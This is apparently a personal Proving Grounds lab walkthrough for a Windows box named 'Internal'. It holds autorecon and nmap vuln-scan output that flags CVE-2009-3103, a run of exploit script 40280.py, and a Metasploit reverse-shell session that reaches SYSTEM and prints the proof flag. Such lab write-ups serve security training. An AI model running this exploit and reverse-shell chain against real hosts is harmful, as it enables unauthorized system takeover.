Exact same as Helpdesk lmao

```
──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Internal]
└─$ sudo /home/kali/.local/bin/autorecon 192.168.90.40 -v 
[sudo] password for kali: 
[*] Scanning target 192.168.90.40
[*] Port scan Top TCP Ports (top-tcp-ports) running against 192.168.90.40
[*] Port scan All TCP Ports (all-tcp-ports) running against 192.168.90.40
[*] Port scan Top 100 UDP Ports (top-100-udp-ports) running against 192.168.90.40
[*] Discovered open port udp/53 on 192.168.90.40
[*] Discovered open port udp/137 on 192.168.90.40
[*] Discovered open port tcp/3389 on 192.168.90.40
[*] Discovered open port tcp/445 on 192.168.90.40
[*] Discovered open port tcp/135 on 192.168.90.40
[*] Discovered open port tcp/53 on 192.168.90.40
[*] Discovered open port tcp/139 on 192.168.90.40
[*] Discovered open port tcp/49158 on 192.168.90.40
[*] 08:21:04 - There are 3 scans still running against 192.168.90.40: top-tcp-ports, all-tcp-ports, top-100-udp-ports
[*] 08:22:04 - There are 3 scans still running against 192.168.90.40: top-tcp-ports, all-tcp-ports, top-100-udp-ports
[*] Identified service domain on tcp/53 on 192.168.90.40
[*] Identified service msrpc on tcp/135 on 192.168.90.40
[*] Identified service netbios-ssn on tcp/139 on 192.168.90.40
[*] Identified service microsoft-ds on tcp/445 on 192.168.90.40
[*] Identified service ms-wbt-server on tcp/3389 on 192.168.90.40
[*] Identified service http on tcp/5357 on 192.168.90.40
[*] Identified service msrpc on tcp/49152 on 192.168.90.40
[*] Identified service msrpc on tcp/49153 on 192.168.90.40
[*] Identified service msrpc on tcp/49154 on 192.168.90.40
[*] Identified service msrpc on tcp/49155 on 192.168.90.40
[*] Identified service msrpc on tcp/49156 on 192.168.90.40
[*] Identified service msrpc on tcp/49157 on 192.168.90.40
[*] Identified service msrpc on tcp/49158 on 192.168.90.40
[*] Service scan DNS Reverse Lookup (tcp/53/domain/dns-reverse-lookup) running against 192.168.90.40
[*] Service scan DNS Zone Transfer (tcp/53/domain/dns-zone-transfer) running against 192.168.90.40
[*] Service scan Nmap DNS (tcp/53/domain/nmap-dns) running against 192.168.90.40
[*] Service scan Nmap MSRPC (tcp/135/msrpc/nmap-msrpc) running against 192.168.90.40
[*] Service scan rpcdump (tcp/135/msrpc/rpcdump) running against 192.168.90.40
[*] Service scan Enum4Linux (tcp/139/netbios-ssn/enum4linux) running against 192.168.90.40
[*] Service scan nbtscan (tcp/139/netbios-ssn/nbtscan) running against 192.168.90.40
[*] Service scan Nmap SMB (tcp/139/netbios-ssn/nmap-smb) running against 192.168.90.40
[*] Service scan SMBClient (tcp/139/netbios-ssn/smbclient) running against 192.168.90.40
[*] Service scan SMBMap (tcp/139/netbios-ssn/smbmap) running against 192.168.90.40
[*] Service scan Nmap SMB (tcp/445/microsoft-ds/nmap-smb) running against 192.168.90.40
[*] Service scan SMBMap (tcp/445/microsoft-ds/smbmap) running against 192.168.90.40
[*] Service scan Nmap RDP (tcp/3389/ms-wbt-server/nmap-rdp) running against 192.168.90.40
[*] Service scan SSL Scan (tcp/3389/ms-wbt-server/ssl-scan) running against 192.168.90.40
[*] Service scan Directory Buster (tcp/5357/http/dirbuster) running against 192.168.90.40
[*] Service scan Curl (tcp/5357/http/curl) running against 192.168.90.40
[*] Service scan Curl Robots (tcp/5357/http/curl-robots) running against 192.168.90.40
[*] Service scan Nmap HTTP (tcp/5357/http/nmap-http) running against 192.168.90.40
[*] Service scan whatweb (tcp/5357/http/whatweb) running against 192.168.90.40
[*] Service scan wkhtmltoimage (tcp/5357/http/wkhtmltoimage) running against 192.168.90.40
[*] Service scan Nmap MSRPC (tcp/49152/msrpc/nmap-msrpc) running against 192.168.90.40
[*] Service scan rpcdump (tcp/49152/msrpc/rpcdump) running against 192.168.90.40
[*] Service scan Nmap MSRPC (tcp/49153/msrpc/nmap-msrpc) running against 192.168.90.40
[*] Service scan rpcdump (tcp/49153/msrpc/rpcdump) running against 192.168.90.40
[*] Service scan Nmap MSRPC (tcp/49154/msrpc/nmap-msrpc) running against 192.168.90.40
[*] Service scan rpcdump (tcp/49154/msrpc/rpcdump) running against 192.168.90.40
[*] Service scan Nmap MSRPC (tcp/49155/msrpc/nmap-msrpc) running against 192.168.90.40
[*] Service scan rpcdump (tcp/49155/msrpc/rpcdump) running against 192.168.90.40
[*] Service scan Nmap MSRPC (tcp/49156/msrpc/nmap-msrpc) running against 192.168.90.40
[*] Service scan rpcdump (tcp/49156/msrpc/rpcdump) running against 192.168.90.40
[*] Service scan Nmap MSRPC (tcp/49157/msrpc/nmap-msrpc) running against 192.168.90.40
[*] Service scan rpcdump (tcp/49157/msrpc/rpcdump) running against 192.168.90.40
[*] Service scan Nmap MSRPC (tcp/49158/msrpc/nmap-msrpc) running against 192.168.90.40
[*] Service scan rpcdump (tcp/49158/msrpc/rpcdump) running against 192.168.90.40
[*] [tcp/5357/http/curl-robots] There did not appear to be a robots.txt file in the webroot (/).
[*] 08:23:04 - There are 14 scans still running against 192.168.90.40: all-tcp-ports, top-100-udp-ports, tcp/139/netbios-ssn/nmap-smb, tcp/445/microsoft-ds/nmap-smb, tcp/3389/ms-wbt-server/ssl-scan, tcp/5357/http/dirbuster, tcp/5357/http/nmap-http, tcp/49152/msrpc/nmap-msrpc, tcp/49153/msrpc/nmap-msrpc, tcp/49154/msrpc/nmap-msrpc, tcp/49155/msrpc/nmap-msrpc, tcp/49156/msrpc/nmap-msrpc, tcp/49157/msrpc/nmap-msrpc, tcp/49158/msrpc/nmap-msrpc                                                             
[*] Discovered open port tcp/49153 on 192.168.90.40
[*] 08:24:04 - There are 7 scans still running against 192.168.90.40: all-tcp-ports, top-100-udp-ports, tcp/139/netbios-ssn/nmap-smb, tcp/445/microsoft-ds/nmap-smb, tcp/3389/ms-wbt-server/ssl-scan, tcp/5357/http/dirbuster, tcp/5357/http/nmap-http                                                                                          
[*] 08:25:04 - There are 6 scans still running against 192.168.90.40: all-tcp-ports, top-100-udp-ports, tcp/139/netbios-ssn/nmap-smb, tcp/445/microsoft-ds/nmap-smb, tcp/5357/http/dirbuster, tcp/5357/http/nmap-http                                                                                                                           
[*] Discovered open port tcp/49157 on 192.168.90.40
[*] 08:26:04 - There are 5 scans still running against 192.168.90.40: all-tcp-ports, top-100-udp-ports, tcp/139/netbios-ssn/nmap-smb, tcp/5357/http/dirbuster, tcp/5357/http/nmap-http                                                                                                                                                          
[*] Discovered open port tcp/49152 on 192.168.90.40
[*] 08:27:04 - There are 4 scans still running against 192.168.90.40: all-tcp-ports, top-100-udp-ports, tcp/5357/http/dirbuster, tcp/5357/http/nmap-http
[*] Discovered open port tcp/49156 on 192.168.90.40
[*] Discovered open port tcp/49155 on 192.168.90.40
[*] 08:28:04 - There are 4 scans still running against 192.168.90.40: all-tcp-ports, top-100-udp-ports, tcp/5357/http/dirbuster, tcp/5357/http/nmap-http
[*] Discovered open port tcp/5357 on 192.168.90.40
[*] 08:29:04 - There are 4 scans still running against 192.168.90.40: all-tcp-ports, top-100-udp-ports, tcp/5357/http/dirbuster, tcp/5357/http/nmap-http
[*] 08:30:04 - There are 4 scans still running against 192.168.90.40: all-tcp-ports, top-100-udp-ports, tcp/5357/http/dirbuster, tcp/5357/http/nmap-http
[*] Discovered open port tcp/49154 on 192.168.90.40
[*] 08:31:04 - There are 4 scans still running against 192.168.90.40: all-tcp-ports, top-100-udp-ports, tcp/5357/http/dirbuster, tcp/5357/http/nmap-http
[*] 08:32:04 - There are 4 scans still running against 192.168.90.40: all-tcp-ports, top-100-udp-ports, tcp/5357/http/dirbuster, tcp/5357/http/nmap-http
[*] 08:33:04 - There are 4 scans still running against 192.168.90.40: all-tcp-ports, top-100-udp-ports, tcp/5357/http/dirbuster, tcp/5357/http/nmap-http
[*] 08:34:04 - There are 4 scans still running against 192.168.90.40: all-tcp-ports, top-100-udp-ports, tcp/5357/http/dirbuster, tcp/5357/http/nmap-http
[*] Identified service domain on udp/53 on 192.168.90.40
[*] Identified service netbios-ns on udp/137 on 192.168.90.40
[*] Service scan DNS Reverse Lookup (udp/53/domain/dns-reverse-lookup) running against 192.168.90.40
[*] Service scan DNS Zone Transfer (udp/53/domain/dns-zone-transfer) running against 192.168.90.40
[*] Service scan Nmap DNS (udp/53/domain/nmap-dns) running against 192.168.90.40
[*] Service scan Nmap SMB (udp/137/netbios-ns/nmap-smb) running against 192.168.90.40
[*] Service scan SMBMap (udp/137/netbios-ns/smbmap) running against 192.168.90.40
[*] 08:35:04 - There are 3 scans still running against 192.168.90.40: tcp/5357/http/dirbuster, tcp/5357/http/nmap-http, udp/53/domain/nmap-dns
[*] 08:36:04 - There are 2 scans still running against 192.168.90.40: tcp/5357/http/dirbuster, tcp/5357/http/nmap-http
[*] 08:37:04 - There are 2 scans still running against 192.168.90.40: tcp/5357/http/dirbuster, tcp/5357/http/nmap-http
[*] 08:38:04 - There are 2 scans still running against 192.168.90.40: tcp/5357/http/dirbuster, tcp/5357/http/nmap-http
[*] 08:39:04 - There are 2 scans still running against 192.168.90.40: tcp/5357/http/dirbuster, tcp/5357/http/nmap-http
[*] 08:40:04 - There is 1 scan still running against 192.168.90.40: tcp/5357/http/dirbuster
[*] 08:41:04 - There is 1 scan still running against 192.168.90.40: tcp/5357/http/dirbuster
[*] 08:42:04 - There is 1 scan still running against 192.168.90.40: tcp/5357/http/dirbuster
[*] 08:43:04 - There is 1 scan still running against 192.168.90.40: tcp/5357/http/dirbuster
[*] 08:44:04 - There is 1 scan still running against 192.168.90.40: tcp/5357/http/dirbuster
Exception ignored in: <function BaseSubprocessTransport.__del__ at 0x7f02003fa5e0>
Traceback (most recent call last):
  File "/usr/lib/python3.9/asyncio/base_subprocess.py", line 126, in __del__
  File "/usr/lib/python3.9/asyncio/base_subprocess.py", line 104, in close
  File "/usr/lib/python3.9/asyncio/unix_events.py", line 536, in close
  File "/usr/lib/python3.9/asyncio/unix_events.py", line 560, in _close
  File "/usr/lib/python3.9/asyncio/base_events.py", line 746, in call_soon
  File "/usr/lib/python3.9/asyncio/base_events.py", line 510, in _check_closed
RuntimeError: Event loop is closed
                                                                                                                                                                        
┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Internal]
└─$ touch README.md
                                                                                                                                                                        
┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Internal]
└─$ 

```

```
┌──(kali㉿kali)-[/tmp]
└─$ nmap -p 135,445,3389 --script vuln 192.168.90.40  -Pn -v                                                                                                      130 ⨯
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-12 08:39 EST
NSE: Loaded 105 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 08:39
Completed NSE at 08:39, 10.00s elapsed
Initiating NSE at 08:39
Completed NSE at 08:39, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 08:39
Completed Parallel DNS resolution of 1 host. at 08:39, 0.01s elapsed
Initiating Connect Scan at 08:39
Scanning 192.168.90.40 [3 ports]
Discovered open port 3389/tcp on 192.168.90.40
Discovered open port 135/tcp on 192.168.90.40
Discovered open port 445/tcp on 192.168.90.40
Completed Connect Scan at 08:39, 0.20s elapsed (3 total ports)
NSE: Script scanning 192.168.90.40.
Initiating NSE at 08:39
NSE: [tls-ticketbleed] Not running due to lack of privileges.
NSE: [firewall-bypass] lacks privileges.
NSE: [ssl-ccs-injection] No response from server: TIMEOUT
Completed NSE at 08:40, 90.66s elapsed
Initiating NSE at 08:40
Completed NSE at 08:40, 0.00s elapsed
Nmap scan report for 192.168.90.40
Host is up (0.20s latency).

PORT     STATE SERVICE
135/tcp  open  msrpc
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
|_ssl-ccs-injection: No reply from server (TIMEOUT)
|_sslv2-drown: 

Host script results:
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: TIMEOUT
| smb-vuln-cve2009-3103: 
|   VULNERABLE:
|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2009-3103
|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,
|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a
|           denial of service (system crash) via an & (ampersand) character in a Process ID High header field in a NEGOTIATE
|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,
|           aka "SMBv2 Negotiation Vulnerability."
|           
|     Disclosure date: 2009-09-08
|     References:
|       http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: TIMEOUT

NSE: Script Post-scanning.
Initiating NSE at 08:40
Completed NSE at 08:40, 0.00s elapsed
Initiating NSE at 08:40
Completed NSE at 08:40, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 101.61 seconds
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 
```



```
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ python 40280.py 192.168.90.40 1                                                                                                                               255 ⨯
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 362 bytes
Final size of python file: 1767 bytes
Enter WORKGROUP\Administrator's password: 
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 

```

```
┌──(kali㉿kali)-[~]
└─$ sudo msfconsole -q   
[sudo] password for kali: 
msf5 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > set payload windows/shell/reverse_tcp
payload => windows/shell/reverse_tcp
msf5 exploit(multi/handler) > set RHOST 192.168.90.40
RHOST => 192.168.90.40
msf5 exploit(multi/handler) > set LHOST 192.168.90.40
LHOST => 192.168.90.40
msf5 exploit(multi/handler) > set LHOST 192.168.49.90
LHOST => 192.168.49.90
msf5 exploit(multi/handler) > set LPORT 443
LPORT => 443
msf5 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.49.90:443 
[*] Encoded stage with x86/shikata_ga_nai
[*] Sending encoded stage (267 bytes) to 192.168.90.40
[*] Command shell session 1 opened (192.168.49.90:443 -> 192.168.90.40:49159) at 2022-01-12 08:57:21 -0500

Microsoft Windows [Version 6.0.6001]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>cd \
cd \

C:\>cd Users\Administrator\Desktop
cd Users\Administrator\Desktop

C:\Users\Administrator\Desktop>hostname
hostname
internal

C:\Users\Administrator\Desktop>whoami
whoami
nt authority\system

C:\Users\Administrator\Desktop>type proof.txt
type proof.txt
0a16082a3ecd410f1fcc880394bf2171

C:\Users\Administrator\Desktop>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 192.168.90.40
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.90.254

Tunnel adapter Local Area Connection*:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 

Tunnel adapter Local Area Connection* 9:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 

C:\Users\Administrator\Desktop>

```

![](Pasted%20image%2020220112220043.png)